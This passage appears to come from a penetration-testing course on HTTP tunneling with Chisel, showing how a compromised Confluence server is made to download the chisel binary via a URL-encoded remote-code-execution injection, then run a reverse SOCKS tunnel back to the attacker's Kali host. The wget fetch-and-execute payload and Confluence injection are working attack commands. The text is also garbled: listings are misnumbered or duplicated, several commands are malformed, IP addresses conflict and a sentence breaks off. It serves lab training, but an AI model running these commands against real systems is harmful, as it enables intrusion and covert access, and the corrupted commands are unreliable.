
This is a hypothetical scenario: we haven't actually implemented any deep packet inspection in the exercise lab! But imagining these restrictions can help us develop robust tunneling strategies.

The network configuration for this scenario is shown in the following diagram:

![](img/336d6ea891e7464f18ad64426619ced4_614_0.png)

Figure 261: The network setup with a firewall/deep packet inspector monitoring the data stream to CONFLUENCE01 on the WAN interface

In this case, the FIREWALL/INSPECTOR device has replaced the previous simple firewall. In addition, MULTISERVER0 is blocked on the WAN interface.

We have credentials for PGDATABASE01, but need to figure out how to SSH directly through CONFLUENCE01. We need a tunnel to the internal network, but it must resemble an outgoing HTTP connection from CONFLUENCE01.

## 19.1.2 HTTP Tunneling with Chisel

The above is a perfect scenario for Chisel, an HTTP tunneling tool that encapsulates our data stream through HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted.

Chisel uses a client/server model. A Chisel server must be set up, which can accept a connection from the Chisel client. Various port forwarding options are available depending on the server and client configurations. One that is particularly useful is reverse port forwarding, which is similar to SSH remote port forwarding.

> 906 (Github, 2022), https://github.com/jillora/chisel

Our intended client was running a different operating system or architecture, we would have to download the binary for that operating system and architecture from the Chisel Github releases page.

In this case, both CONFLUENCE01 and our Kali machine are amd64 Linux machines. That means we can simply serve the same chisel binary on our Kali machine, and run it on CONFLUENCE01. We can copy the chisel binary to Apache2 server's webroot directory.

```
kali@kali:~$ sudo cp $(chisel) /var/www/html/
kali@kali:~$ 
```

Listing 586 - Copying the chisel binary to the Apache2 server loader

We can then make sure Apache2 is running on our machine.

```
kali@kali:~ sudo systemctl start apache2
[sudo] password for kali:
kali@kali:~$ 
```

Listing 587 - Starting Apache2

Next, we will build the wget command we'll eventually run through our web shell on CONFLUENCE01. This command will download the chisel binary to /tmp/chisel and make it executable.

```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

Listing 588 - The Wget payload we use to download the chisel binary to /tmp/chisel on CONFLUENCE01 and make it executable

Next, we'll format this command to work with curl Confluence injection:

> As before, you can modify the specific parts of the URL-encoded RCE payload that you need to, rather than building a new payload from scratch, to avoid formatting difficulties.

```
kali@kali:~$ curl
http://192.168.50.63:8090/%2B%20javascript.script.ScriptEngineManager%28%29.getByName%28%22hashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%20%22%20%22%27wget%27%20%20192.168.118.4/chisel%20%2D%20/tmp/chisel%27%29.start%22%22%22%7D/
kali@kali:~$ 
```

Listing 589 - The wget command executed within our curl Confluence injection command

The Apache2 log (/var/apache2/access.log) eventually shows the request for the chisel binary:

```
kali@kali:-$ tail -f /var/log/apache2/access.log
```

```
...
192.168.50.63 - [21/Aug/2022:17:41:49 -0400] "GET /HTTP/1.1" 200 8750339 "-" Wget -i/1.2.0.3 (linux-gnu)"
```

Listing 590 - The request for the chisel binary hitting our Apache2 server.

Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On the Kali machine, we will start the server as a server using the server subcommand, along with the bind (--port) and the --reverse flag injection to allow the reverse port forward.

```
kali@kali:-$ server --port 8080 --reverse
2022/07/22 16:43:22 server: Reverse tunelling enabled
2022/07/22 16:43:22 server: Fingerprint mZANuWndvrRnJgBasGQtqbbe0tKKanpoQqJgNy7:
2022/07/22 16:43:22 server: Listening on http://0.0.0.0
```

Listing 591 - Starting the Chisel server on port 8080.

The Chisel server up and confirms that it is listening on port 8080, and has reverse tunelling.

Before we run chisel, we will create the tunnel on our Kali machine to log the chisel traffic. We will capture the traffic using sudo tcpdump tun tcp port 8080 to isolate the chisel traffic.

```
kali@kali:-$ sudo tcpdump tun tun tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
tcpdump: listening on tun0 via tcp/port 8080 through tun0
```

Next, we will start the chisel from the web shell, using the server address and the port forwarding options on the line. We will connect to the server running on our Kali machine (192.168.1.4:8080), creating a SOCKS tunnel (which is bound to port 1080 by default). The remaining redirections to /dev/null force the process to run in the background, which will free up our shell.

```
kali@kali:~$ chisel client -s 192.168.1.4:8080 -reverse > /dev/null &
```

Listing 592 - Starting the chisel client from the web shell.

```
kali@kali:-~$ curl http://192.168.50.63:8090/%2B%20javascript.script.ScriptEngineManager%28%29.getByName%28%22hashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%20%22%20%22%27wget%27%20%20192.168.118.4/chisel%20%2D%20/tmp/chisel%27%29.start%22%22%22%7D/
```

Listing 593 - Starting the chisel client using confluence injection.

We will then create an injection, and connect to CONFLUENCE01. Tcpdump instantly reveals our traffic to the Chisel server, some of which is familiar.

```
kali@kali:-$ sudo tcpdump tun tun tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
tcpdump: listening on tun0 via tcp/port 8080 through tun0
```

Listing 519 - Inbound chisel traffic logged by tcpdump

The traffic indicates that the chisel client has created an HTTP WebSocket connection with the

Our chisel server logged an inbound connection.

```
kali@kali: chisel server --port 8080 --reverse
2022/08/21 17:57:52 server: Route tunneling enabled
2022/08/21 17:57:52 server: Fingerprint PrAuAFgUnExYKI14RMMeItaCcmJ6kj4zsaS2LX77
2022/08/21 17:57:52 server: Listening on http://0.0.0.0:8080
```

Next, we check the status of our SOCKS proxy with.

```
kali@kali: ss -ntlpu
Netid State Recv-Q Send-Q Local Address:Port Peer
Address:Port Process
udp UNCONN 0 0 0.0.0.0:34877 0.0.0.0:*
tcp LISTEN 0 4096 127.0.0.1:1080
```
